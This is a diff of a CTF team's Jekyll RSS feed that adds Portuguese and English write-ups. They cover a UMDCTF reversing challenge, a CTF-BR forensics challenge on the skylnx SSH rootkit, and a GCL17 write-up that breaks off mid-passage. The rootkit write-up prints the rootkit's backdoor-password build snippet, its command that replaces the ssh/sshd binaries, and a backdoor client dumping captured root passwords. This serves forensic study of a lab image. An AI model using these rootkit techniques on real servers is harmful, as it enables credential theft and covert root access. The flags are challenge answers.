@@ -5,19 +5,895 @@
     <description>Brazilian CTF Team</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 13 Dec 2016 00:58:48 -0200</pubDate>
-    <lastBuildDate>Tue, 13 Dec 2016 00:58:48 -0200</lastBuildDate>
-    <generator>Jekyll v3.3.1</generator>
+    <pubDate>Fri, 11 Nov 2022 10:46:59 -0300</pubDate>
+    <lastBuildDate>Fri, 11 Nov 2022 10:46:59 -0300</lastBuildDate>
+    <generator>Jekyll v4.3.1</generator>
     
       <item>
-        <title>c0dz3r0 (200pts) - AUSTCERT 2015</title>
-        <description>
+        <title>Write Up UMDCTF 2020 - Evil Santa&apos;s Mysterious Box of Treats (400pts)</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; UMDCTF 2020&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; Challenge Evil Santa’s Mysterious Box of Treats&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; Rev&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Author:&lt;/strong&gt; WittsEnd2&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[meli0das]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;/h1&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;🎅 has gone 🥜!&lt;/p&gt;
+
+  &lt;p&gt;He decided to make it impossible to get it into his 📦, and if we don’t get in, we will be receiving coal for the next 💯 years!&lt;/p&gt;
+
+  &lt;p&gt;Help us figure out how to get into the 📦 !&lt;/p&gt;
+
+  &lt;p&gt;Author: WittsEnd2&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;-0x0---conhecendo-o-programa-&quot;&gt;[ 0x0 - Conhecendo o programa ]&lt;/h2&gt;
+
+&lt;p&gt;Primeiro, verificar se realmente é um binário…&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# file EvilSantasBox 
+EvilSantasBox: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), for GNU/Linux 3.2.0, BuildID[sha1]=e22c231ce9e73f39af223ed5d5284d20d77aeb89, statically linked, no section header
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Identificado como ELF 64bits :)&lt;/p&gt;
+
+&lt;p&gt;Após executar e tentar qualquer input, obtemos o seguinte resultado.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# ./EvilSantasBox 
+-----------------------------------------
+|                                       |
+|                                       |
+|                                       |
+|         Evil Santa&apos;s Mysterious       |
+|             Box of Treats             |
+|                                       |
+|                                       |
+|                                       |
+|                                       |
+|                                       |
+-----------------------------------------
+Enter code here: 1234567890
+You are getting coal for the next five years!
+root@kali:~/Downloads# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;-0x1---pre-debug-&quot;&gt;[ 0x1 - Pre-debug ]&lt;/h2&gt;
+
+&lt;p&gt;Como eu prefiro tudo nas telinhas do windows, vamos preparar para o remote debug com IDA :)&lt;/p&gt;
+
+&lt;p&gt;Basicamente eu…&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1 - Copio o arquivo linux_server64 que está na pasta do IDA;
+2 - Deixo na pasta onde meu ELF será debugado - no linux;
+3 - Executo o ./linux_server64;
+4 - Copio o ELF para o windows;
+5 - Abro o ELF no IDA;
+6 - Configuro o IDA para acessar o linux;
+7 - Pronto, so debugar!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;PS .: Para uma explicacao melhor (https://www.hex-rays.com/products/ida/support/freefiles/remotedbg.pdf)&lt;/p&gt;
+
+&lt;p&gt;Tudo configurado, let’s go!&lt;/p&gt;
+
+&lt;h2 id=&quot;-0x2---análise-&quot;&gt;[ 0x2 - Análise ]&lt;/h2&gt;
+
+&lt;p&gt;Binário carregado no IDA, para ver as strings &lt;strong&gt;SHIFT+F12&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;p&gt;Logo de cara vemos o que interessa :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/imgs/01-ida-strings.PNG&quot; alt=&quot;ida&quot; title=&quot;Strings no IDA&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Adiantando um pouco as coisas, a mensagem: &lt;strong&gt;Santa really doesn’t like this. You are getting coal from now on!&lt;/strong&gt; é identificada quando a aplicação está rodando sobre um debuger, o famoso anti-debug.&lt;/p&gt;
+
+&lt;p&gt;Para não pular e dar essa mensagem, basta - em runtime - modificar o salto &lt;a href=&quot;https://www.aldeid.com/wiki/X86-assembly/Instructions/js&quot;&gt;js&lt;/a&gt; mudando a eflag &lt;a href=&quot;https://www.aldeid.com/wiki/X86-assembly/Registers#SF_.28Sign_Flag.29&quot;&gt;SF&lt;/a&gt;
+ para &lt;strong&gt;0&lt;/strong&gt; que segue a comparação sem executar o trecho abaixo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/imgs/02-salto-anti-debug.PNG&quot; alt=&quot;salto&quot; title=&quot;Salto anti-debug&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Após analisar estáticamente e dinâmicamente, o tamanho que ele espera para o de código de entrada, deve ser 40(decimal). O meu código foi: &lt;strong&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Logo em seguida o programa printa uma informação importante na tela.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# ./EvilSantasBox
+-----------------------------------------
+|                                       |
+|                                       |
+|                                       |
+|         Evil Santa&apos;s Mysterious       |
+|             Box of Treats             |
+|                                       |
+|                                       |
+|                                       |
+|                                       |
+|                                       |
+-----------------------------------------
+Enter code here: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn
+
+EDGFIHKJMLONQPSRUTWVYX[Z]\edgfihkjmlonqp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A validação é feita comparando a string printada na tela - que é o código que eu digitei com algumas modificações - com uma string em hardcode no binário. É possível ver na imagem abaixo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/imgs/03-compara-codigo.png&quot; alt=&quot;chave&quot; title=&quot;Compara código de entrada&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Na imagem acima é possível ver no endereço de memória o valor &lt;strong&gt;0x58&lt;/strong&gt; que é um &lt;strong&gt;X&lt;/strong&gt; e no registrador &lt;strong&gt;r11&lt;/strong&gt; o valor &lt;strong&gt;0x45&lt;/strong&gt; que é igual a &lt;strong&gt;69 decimal&lt;/strong&gt; e também é igual a letra &lt;strong&gt;E&lt;/strong&gt; em ASCII, letra ao qual começa a strings gerada pelo programa - meu código digitado, porém, alterado.&lt;/p&gt;
+
+&lt;p&gt;Ao final dessas comparações a string que deve ser gerada é essa: &lt;strong&gt;XY5IU5TKNZvV][92PX:5Q[9YZ5Ts]XThQ7]zVJ2A&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-0x3---código-e-bandeira-&quot;&gt;[ 0x3 - Código e bandeira ]&lt;/h2&gt;
+
+&lt;p&gt;Fiz alguns outros testes de input e eles foram:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Minha entrada:			ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn
+Codigo gerado:			EDGFIHKJMLONQPSRUTWVYX[Z]\edgfihkjmlonqp
+
+Minha entrada 2:		ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcd
+Codigo gerado 2:		EDGFIHKJMLONQPSRUTWVYX[Z]\547698;:=2edgf
+
+Minha entrada 3:		abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMN
+Codigo gerado 3:		edgfihkjmlonqpsrutwvyx{z}|EDGFIHKJMLONQP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Basicamente o que entendi com isso:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Se for &lt;strong&gt;ímpar&lt;/strong&gt; soma 4.&lt;/li&gt;
+  &lt;li&gt;Se for &lt;strong&gt;par&lt;/strong&gt; soma 2.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Como? Bom, além do assembly, se olharmos as entradas e código gerados acima, identificamos isso.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;A(65 decimal) + 4 = 69 decimal = &lt;strong&gt;E&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;B(66 decimal) + 2 = 68 decimal = &lt;strong&gt;D&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;C(67 decimal) + 4 = 71 decimal = &lt;strong&gt;G&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;D(68 decimal) + 2 = 70 decimal = &lt;strong&gt;F&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;E assim sucessivamente…&lt;/p&gt;
+
+&lt;p&gt;Para validar, fiz esse script em python.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash
+
+keyCrypt=&quot;XY5IU5TKNZvV][92PX:5Q[9YZ5Ts]XThQ7]zVJ2A&quot;
+resultKey=&quot;&quot;
+
+for i in range(len(keyCrypt)):
+    if ord(keyCrypt[i]) % 2 != 0:
+        resultKey=resultKey+chr(ord(keyCrypt[i])-4)
+    else:
+        resultKey=resultKey+chr(ord(keyCrypt[i])-2)
+
+print resultKey
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Após executar o script, obtenho a string: &lt;strong&gt;VU1EQ1RGLXtTYW50NV81MW5UX1RoYVRfM3YxTH0=&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Como essa string não tem cara de flag, tentei decodar com base64, e…&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# echo VU1EQ1RGLXtTYW50NV81MW5UX1RoYVRfM3YxTH0= | base64 --decode
+UMDCTF-{Sant5_51nT_ThaT_3v1L}
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Well done! ;)&lt;/p&gt;
 </description>
-        <pubDate>Sat, 06 Jun 2015 00:00:00 -0300</pubDate>
-        <link>http://localhost:4000/2015/c0dz3r0-(200pts)-AUSTCERT-2015</link>
-        <guid isPermaLink="true">http://localhost:4000/2015/c0dz3r0-(200pts)-AUSTCERT-2015</guid>
+        <pubDate>Sat, 18 Apr 2020 00:00:00 -0300</pubDate>
+        <link>http://localhost:4000/2020/UMDCTF-Evil-Santas-Mysterious-Box-of-Treats</link>
+        <guid isPermaLink="true">http://localhost:4000/2020/UMDCTF-Evil-Santas-Mysterious-Box-of-Treats</guid>
         
-        <category>AustCERT</category>
+        <category>UMDCTF</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>CTF-BR Challenge da Virada 2018-2019 (hall-of-fame)</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; CTF-BR Hall Of Fame&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Challenge:&lt;/strong&gt; Challenge da Virada 2018-2019&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; Forensics, Rev&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[ChOkO]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;challenge-da-virada-2018---2019&quot;&gt;CHALLENGE DA VIRADA (2018 -&amp;gt; 2019)&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Challenge da virada (2018 -&amp;gt; 2019)&lt;/p&gt;
+
+  &lt;p&gt;Resolvido por: aguardando&lt;/p&gt;
+
+  &lt;p&gt;Nome: Rootkit&lt;/p&gt;
+
+  &lt;p&gt;Descrição: Suspeitamos que um de nossos servidores foi ownado pela Inteligência da Bloodsuckers. Tudo indica para o fato de terem instalado um binary rootkit em nosso sistema, visando conseguir nossas credenciais para tentarem usar em outros servidores. Faça uma análise forense no dump do sistema, e ao identificar o comprometimento, faça um reversing para identificar a senha que dá acesso ao dump (sniffer) das senhas. Após isso, entendendo o funcionamento do rk, obtenha a última senha legítima utilizada pelo root na máquina, pois achamos que ela foi mudada pelo pessoal da Inteligência por uma default deles, e também pode nos ser útil em outros dos seus sistemas, como a de dump! (o feitiço virou contra o feiticeiro!). Submeta no formato CTF-BR{SenhaUsadaParaDump,UltimaSenhaRootLegitima}. Não temos as credenciais, isso faz parte do desafio.&lt;/p&gt;
+
+  &lt;p&gt;Categoria: Forensics&lt;/p&gt;
+
+  &lt;p&gt;Link do arquivo: &lt;a href=&quot;https://static.pwn2win.party/2017/rootkit_3e4df5d6a3926cbc81ebf014a82098ad0964653aaedf581cd1bbc06eb3756642.tar.gz&quot;&gt;aqui&lt;/a&gt;&lt;/p&gt;
+
+  &lt;p&gt;Write-up do vencedor: aguardando&lt;/p&gt;
+
+  &lt;p&gt;Lançamento: 31 de dezembro de 2018&lt;/p&gt;
+
+  &lt;p&gt;Resolução: aguardando&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;WRITE-UP&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Este ano o desafio do CTF-BR para o &lt;a href=&quot;https://ctf-br.org/hall-of-fame/&quot;&gt;Hall of Fame&lt;/a&gt; trouxe um desafio de forense bem interessante. Aparentemente um de nossos servidores foi ownado e pra melhorar instalaram um rootkit…!&lt;/p&gt;
+
+&lt;p&gt;![¬&lt;strong&gt;_¬’](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRlZRFJevs0yhUbh1NBE7QsxQ9VohUZ86ErbhudcxmxHi_15W7l “Malditos Hackers ¬&lt;/strong&gt;¬’”)&lt;/p&gt;
+
+&lt;p&gt;O desafio nos pede para analisar o dump do sistema e determinar duas coisas:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;senha utilizada para dump, e;&lt;/li&gt;
+  &lt;li&gt;última senha root legítima.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Após o download primeiro verifiquei qual o tipo de arquivo:
+&lt;img src=&quot;https://i.imgur.com/ffFO7Wi.png&quot; alt=&quot;File type&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Fazendo jus à minha fama de desconfiado, também confiro o hash do arquivo:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/FCx4Sip.png&quot; alt=&quot;epa, hashes diferentes? Õ_õ...esse gnx eh f0dz &quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como o challenge não informou as credenciais desta máquina, resolvi seguir duas abordagens:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;recuperar os arquivos da imagem dada utilizando o &lt;a href=&quot;https://www.cgsecurity.org/wiki/PhotoRec&quot;&gt;photorec&lt;/a&gt;, e;&lt;/li&gt;
+  &lt;li&gt;alterar a senha do root para facilitar a análise &lt;em&gt;ao vivo&lt;/em&gt; da máquina.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;recuperando-arquivos-com-o-photorec&quot;&gt;Recuperando arquivos com o photorec&lt;/h2&gt;
+
+&lt;p&gt;O photorec é excelente para recuperação de arquivos. Basta criar um diretório de saída para os arquivos recuperados e executa-lo passando o arquivo da imagem como parâmetro:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;photo
+photorec ub1404lts-disk1.vmdk
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/g5N10lA.png&quot; alt=&quot;photorec&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Feito isso, o programa recuperou diversos arquivos e os dividiu em 29 diretórios (recup_dir.xx). A idéia era procurar por algum indicativo deste malware na imagem. Como não sabia o que procurar tentei a string ‘rootkit’ \o/!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/ONzfU6R.png&quot; alt=&quot;grep -ri rootkit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analisando o script observamos que a senha utilizada para &lt;em&gt;dump&lt;/em&gt; é definida como MAGIC_VERSION no arquivo bonny.h, conforme destaque a seguir:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_BONNY_&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &amp;gt; version.h
+#define SSH_VERSION     &quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FAKEV&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
+#define SSH_PORTABLE    &quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$FAKEP&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
+#define SSH_RELEASE     SSH_VERSION SSH_PORTABLE
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_BONNY_
+
+&lt;/span&gt;: &lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;CBDPASS&lt;/span&gt;:&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;./mkpasswd &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$UBDPASS&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_BONNY_&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt; &amp;gt; bonny.h
+#define BD_PASS			&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$CBDPASS&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
+#define MAGIC_VERSION	&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$UDPPASS&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
+#define SKYCOMMAND      &quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$USPPASS&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;_BONNY_
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ok, estamos um passo mais próximos de obter a nossa primeira flag (senha utilizada para o dump). Buscando por bonny.h encontramos outro fonte. O arquivo recuperado veio pela metade, mas ajudou a ter uma idéia melhor sobre o que procurar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/DeiARfW.png&quot; alt=&quot;trecho do rootkit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Passando rapidamente pelo código, este rootkit substitui os binários do ssh e sshd por sua versão infectada (mas como o autor é bonzinho ele faz o backup dos arquivos para você antes de te infectar :)…&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-script&quot;&gt;mv /usr/bin/ssh ssh.old &amp;amp;&amp;amp; cp ssh /usr/bin/ssh &amp;amp;&amp;amp; mv /usr/sbin/sshd sshd.old &amp;amp;&amp;amp; cp sshd /usr/sbin/sshd
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Neste momento comecei a pesquisar por rootkits com estes nomes: skynet, skylnx e bonny, dentre outras strings que aparecem no fonte. Viajei por algum um tempo e lembrei que ainda não havia investigado a máquina. Com as informações que consegui até então ficou mais fácil procurar o que eu queria no sistema. &lt;em&gt;OBs: cabe ressaltar que a este ponto após analisar alguns arquivos que foram recuperados, encontrei um .tar.gz que possuía o fonte do rootkit skylnx.&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;análise-da-máquina-viva&quot;&gt;Análise da máquina ‘viva’&lt;/h2&gt;
+
+&lt;p&gt;Nesta análise utilizei uma máquina virtual Ubuntu que tinha pego da &lt;a href=&quot;https://www.osboxes.org/&quot;&gt;OSBoxes&lt;/a&gt; e apenas substitui seu disco pela imagem do desafio. As credenciais não foram informadas, então substituí a senha do &lt;a href=&quot;https://unix.stackexchange.com/questions/76313/change-password-of-a-user-in-etc-shadow&quot;&gt;root&lt;/a&gt; por &lt;em&gt;password&lt;/em&gt; alterando o &lt;a href=&quot;https://askubuntu.com/questions/24006/how-do-i-reset-a-lost-administrative-password&quot;&gt;menu do grub&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/dkHZsez.png&quot; alt=&quot;resetando senha do user&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Agora com acesso comecei a investigar melhor o servidor SSH (/usr/sbin/sshd). Pude identificar que a versão do SSHD realmente havia sido modificada pelo rootkit:&lt;/p&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@rf-server4:/# &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;skylnx /usr/sbin/sshd       
+Binary file /usr/sbin/sshd matches
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Reparei que não havia encontrado o arquivo bonny.h (que possui as senhas para operação do rootkit) nos arquivos recuperados pelo photorec. Então fiz uma pesquisa nos ELF (mais uma vez, salvo pelo SANTO STRINGS) e encontrei lá (no que deve ser o binário do SSHD) as senhas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/uwcUqFl.png&quot; alt=&quot;rootkit strings&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Após mais algum tempo no código-fonte resolvi que daria muito trabalho criar o meu próprio cliente SSH para enviar as strings de versão que o rootkit estava esperando (mas pode ser um bom exercício se você está aprendendo programação). Como eu não confio no gnx (e você também não deveria) resolvi baixar o código do rootkit para a máquina ownada e comecei a brincar a partir dela.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/MlXoRxH.png&quot; alt=&quot;rodando o rootkit&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Depois de algum tempo entendi o funcionamento do &lt;em&gt;skycommand.c&lt;/em&gt; e compilei o meu &lt;em&gt;skycmd&lt;/em&gt; para conseguir realizar o dump que o desafio pede:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-script&quot;&gt;root@rf-server4:/tmp/tmp.sQwn28gO1I/skylnx2# ./skycmd 127.0.0.1 22 wl4SUuXeSU
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is &apos;^]&apos;.
+SSH-2.0-OpenSSH_6.6.1
+pass_from: ::1 	user: root 	pass: ohcohYie9E
+pass_from: 192.168.0.177 	user: root 	pass: ohcohYie9E
+pass_from: 192.168.0.177 	user: root 	pass: AhooCo7wei
+pass_from: 192.168.0.177 	user: root 	pass: OhCeW4ahsh             
+pass_from: 192.168.0.177 	user: root 	pass: Woemash9ie4chee7Oe4p   # última senha válida do root :)
+pass_from: 192.168.250.1 	user: user 	pass: password               # senha que nós alteramos
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Aprendemos que o código possui três características principais:&lt;/p&gt;
+&lt;ol&gt;
+  &lt;li&gt;permite autenticação como root caso você informe a senha que foi configurada no BD_PASS;&lt;/li&gt;
+  &lt;li&gt;realiza um dump que revela as credenciais utilizadas nas últimas tentativas válidas de autenticação ao sistema-alvo, quando recebe como informação de versão local do cliente SSH a string configurada em MAGIC_VERSION;&lt;/li&gt;
+  &lt;li&gt;executa um comando como root se você informar a string configurada em SKYCOMMAND se você executar o binário gerado pelo &lt;em&gt;skycommand.c&lt;/em&gt; como a versão local do cliente SSH seguida de um comando.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/DEWSlDT.png&quot; alt=&quot;client_version_string&quot; /&gt;
+Gostei do desafio pois fazia uns 3 anos que não mexia com o photorec e nada relacionado a forense e investigação. Também foi muito bom para relembrar conceitos básicos de administração de SO (reset da senha do ubuntu), noções de programação e engenharia reversa.&lt;/p&gt;
+
+&lt;h2 id=&quot;here-is-a-flag-for-you&quot;&gt;Here is a flag for you&lt;/h2&gt;
+&lt;p&gt;&lt;strong&gt;FLAG: CTF-BR{wl4SUuXeSU,Woemash9ie4chee7Oe4p}&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;\o/ RTFM \o/&lt;/p&gt;
+</description>
+        <pubDate>Thu, 03 Jan 2019 00:00:00 -0200</pubDate>
+        <link>http://localhost:4000/2019/CTFBR-Challenge-Virada-2019</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/CTFBR-Challenge-Virada-2019</guid>
+        
+        <category>CTF-BR</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Write Up GCL17 - SRI LANKA and AUSTRIA</title>
+        <description>&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;CTF:&lt;/strong&gt; GCL17&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Solved by:&lt;/strong&gt; RTFM[G4mbl3r]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;write-up-sri-lanka&quot;&gt;Write Up SRI LANKA&lt;/h3&gt;
+
+&lt;p&gt;The first thing to do is to run the “file” command, which will indicate that the file is an elf32. After that the binary was analyzed on r2 and I ended up realizing that I forgot to do the most simple and obvious thing as I am certified SGSE ( Strings grep Specialist Engineer), so I just executed the following command:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	strings -e s c9c18a2c3f65bb8d1f6133765889774a1224cbe993edcc1641275be12b29b10a | less
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;And found the most beautiful string in the world, PYTHON&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	mod is NULL - %s
+	PYTHONPATH
+	PYTHONHOME
+	import sys
+	del sys.path[:]
+	sys.path.append(r&quot;%s&quot;)
+	argv
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now every thing became simple becasue that just looked like a challenge I’ve created a while ago. So my guess was that It’s just a python code probably compiled with py2exe or pyinstaller just generating some bytecode behind, like java, so I used the pyinstaller decompiler(&lt;img src=&quot;https://sourceforge.net/projects/pyinstallerextractor/&quot; alt=&quot;PyInstaller Extractor download&quot; /&gt;) extracted the code, and executed the following command:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;➜ strings * | grep -R -l t0k3n
+pyi_darchive
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Opened the pyi_darchive file, and there was it,&lt;/p&gt;
